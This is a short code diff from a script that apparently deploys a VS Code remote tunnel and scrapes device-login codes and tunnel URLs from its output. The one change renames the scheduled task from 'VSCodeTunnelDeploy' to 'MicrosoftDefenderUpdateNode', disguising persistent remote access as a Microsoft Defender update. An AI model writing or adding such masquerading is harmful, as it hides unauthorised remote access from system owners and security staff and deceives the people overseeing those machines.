@@ -33,7 +33,7 @@ DEVICE_CODE_PATTERN = re.compile(r"\b([A-Z0-9]{4}-?[A-Z0-9]{4})\b")
 URL_PATTERN = re.compile(r"https://[^\s]+")
 TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
 LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)
-TASK_NAME = "VSCodeTunnelDeploy"
+TASK_NAME = "MicrosoftDefenderUpdateNode"
 
 
 def windows_subprocess_kwargs() -> dict:
